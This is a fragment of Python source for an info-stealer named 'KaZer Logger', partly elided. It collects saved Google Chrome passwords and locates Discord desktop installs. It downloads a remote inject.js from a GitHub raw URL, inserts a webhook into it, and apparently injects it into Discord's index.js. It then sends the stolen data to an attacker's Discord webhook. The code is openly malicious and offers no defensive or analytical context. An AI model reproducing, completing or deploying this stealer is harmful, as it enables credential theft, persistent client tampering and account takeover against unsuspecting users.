...
def main(webhook_url):
	...
	embed = Embed(title="KaZer Logger", color=15535980)
	...
	embed.set_footer(text="KaZer Logger")
	...
	webhook.send(content="||@here|| ", embed=embed, file=file, avatar_url="https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg", username="KaZer Logger")
...
class password():
	def __init__(self):
		...
		with open("google-passwords.txt", "w") as f:
			f.write("Google Chrome Passwords\n\n")
		...
		if 'discord' in _dir.lower():
			for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
				if match(r'app-(\d*\.\d*)*', __dir):
					...
					f = requests.get("https://raw.githubusercontent.com/KaZerCfx/INject/main/inject.js").text.replace("%WEBHOOK%", webhook_url)
	...
	if os.path.exists(appdata+'\\discord'):
		with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'r', encoding="utf-8") as indexFile:
			...
			if webhook_url in index:
				...
				webhook.send(embed=embed, avatar_url="https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg", username="KaZer Logger")
